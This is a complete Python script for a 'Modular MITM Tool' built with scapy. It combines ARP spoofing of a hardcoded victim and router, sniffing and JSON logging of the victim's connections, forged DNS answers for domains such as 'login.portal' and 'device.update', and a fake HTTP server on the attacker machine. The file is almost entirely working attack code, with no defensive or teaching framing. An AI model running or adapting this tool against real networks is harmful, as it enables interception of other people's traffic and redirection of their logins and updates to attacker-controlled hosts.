import os
import time
import threading
import json
import socket
import argparse
from scapy.all import ARP, send, sniff, IP, TCP, UDP, DNS, DNSQR, DNSRR, sr1
from ipwhois import IPWhois
from http.server import SimpleHTTPRequestHandler, HTTPServer

class MITMTool:
    def __init__(self, config):
        self.victim_ip = config.victim_ip
        self.router_ip = config.router_ip
        self.attacker_mac = config.attacker_mac
        self.interface = config.interface
        self.spoofed_dns_ip = config.spoofed_dns_ip
        self.victim_mac = config.victim_mac
        self.router_mac = config.router_mac
        self.enable_arp = config.enable_arp
        self.enable_dns = config.enable_dns
        self.enable_sniff = config.enable_sniff
        self.enable_log = config.enable_log
        self.enable_http = config.enable_http
        self.running = True

    def enable_ip_forwarding(self):
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        print("[+] IP forwarding enabled")

    def disable_ip_forwarding(self):
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print("[!] IP forwarding disabled")

    def spoof_arp(self):
        print("[+] Starting ARP spoofing...")
        while self.running:
            victim_packet = ARP(op=2, pdst=self.victim_ip, psrc=self.router_ip,
                                hwdst=self.victim_mac, hwsrc=self.attacker_mac)
            router_packet = ARP(op=2, pdst=self.router_ip, psrc=self.victim_ip,
                                hwdst=self.router_mac, hwsrc=self.attacker_mac)
            send(victim_packet, verbose=False)
            send(router_packet, verbose=False)
            time.sleep(3)

    def restore_arp(self):
        print("[!] Restoring ARP tables...")
        send(ARP(op=2, pdst=self.victim_ip, psrc=self.router_ip, hwdst=self.victim_mac), count=5, verbose=False)
        send(ARP(op=2, pdst=self.router_ip, psrc=self.victim_ip, hwdst=self.router_mac), count=5, verbose=False)

    def sniff_packets(self):
        print("[+] Starting packet sniffing...")
        def process(pkt):
            if pkt.haslayer(IP) and pkt.haslayer(TCP):
                dst_ip = pkt[IP].dst
                dst_port = pkt[TCP].dport
                host, org = self.resolve_ip(dst_ip)
                print(f"{pkt[IP].src} → {dst_ip} | {host} ({org}) | Port: {dst_port}")
                if self.enable_log:
                    self.log_connection(pkt[IP].src, dst_ip, dst_port, host, org)
        sniff(iface=self.interface, prn=process, store=False)

    def dns_spoof(self):
        print("[+] Starting DNS spoofing...")
        spoofable = ["example.com", "test.local", "device.update", "firmware.iot", "login.portal"]
        def spoof(pkt):
            if pkt.haslayer(DNSQR):
                qname = pkt[DNSQR].qname.decode()
                print(f"[DNS] Query for {qname}")
                if any(domain in qname for domain in spoofable):
                    dns_response = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                                UDP(dport=pkt[UDP].sport, sport=53) / \
                                DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                                    an=DNSRR(rrname=qname, rdata=self.spoofed_dns_ip))
                    send(dns_response, verbose=False)
                    print(f"[DNS] Spoofed {qname} → {self.spoofed_dns_ip}")
        sniff(filter="udp port 53", iface=self.interface, prn=spoof, store=False)

    def resolve_ip(self, ip):
        try:
            hostname = socket.gethostbyaddr(ip)[0]
        except:
            hostname = "Unknown"
        try:
            whois = IPWhois(ip).lookup_rdap()
            org = whois.get("network", {}).get("name", "Unknown")
        except:
            org = "Unknown"
        return hostname, org

    def log_connection(self, src, dst, port, host, org):
        entry = {
            "src": src,
            "dst": dst,
            "port": port,
            "host": host,
            "org": org,
            "timestamp": time.time()
        }
        with open("mitm_log.json", "a") as f:
            f.write(json.dumps(entry) + "\n")

    def start_http_server(self):
        print(f"[+] Starting fake HTTP server at {self.spoofed_dns_ip}:80")
        if not os.path.exists("index.html"):
            with open("index.html", "w") as f:
                f.write("<h1>MITM Intercepted</h1><p>This page was served by your attacker machine.</p>")
            print("[+] Created default index.html")
        server = HTTPServer((self.spoofed_dns_ip, 80), SimpleHTTPRequestHandler)
        server.serve_forever()

    def run(self):
        self.enable_ip_forwarding()
        threads = []

        if self.enable_arp:
            threads.append(threading.Thread(target=self.spoof_arp))
        if self.enable_sniff:
            threads.append(threading.Thread(target=self.sniff_packets))
        if self.enable_dns:
            threads.append(threading.Thread(target=self.dns_spoof))
        if self.enable_http:
            threads.append(threading.Thread(target=self.start_http_server))

        for t in threads:
            t.start()

        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[!] Interrupt received, shutting down...")
            self.running = False
            self.restore_arp()
            self.disable_ip_forwarding()

# === CLI CONFIGURATION ===
parser = argparse.ArgumentParser(description="Modular MITM Tool")
parser.add_argument("--arp", action="store_true", help="Enable ARP spoofing")
parser.add_argument("--dns", action="store_true", help="Enable DNS spoofing")
parser.add_argument("--sniff", action="store_true", help="Enable packet sniffing")
parser.add_argument("--log", action="store_true", help="Enable JSON logging")
parser.add_argument("--http", action="store_true", help="Start fake HTTP server")
args = parser.parse_args()

# === STATIC CONFIG ===
class Config:
    victim_ip       = "192.168.0.112"
    router_ip       = "192.168.0.1"
    attacker_mac    = "92:15:44:C7:C6:07"
    interface       = r"\Device\NPF_{12454827-664B-404B-8CC5-273662F64BCA}"
    spoofed_dns_ip  = "192.168.0.175"
    victim_mac      = "70:9c:d1:df:dd:9c"
    router_mac      = "40:3f:8c:cb:6d:70"
    enable_arp      = args.arp
    enable_dns      = args.dns
    enable_sniff    = args.sniff
    enable_log      = args.log
    enable_http     = args.http

# === RUN ===
tool = MITMTool(Config)
tool.run()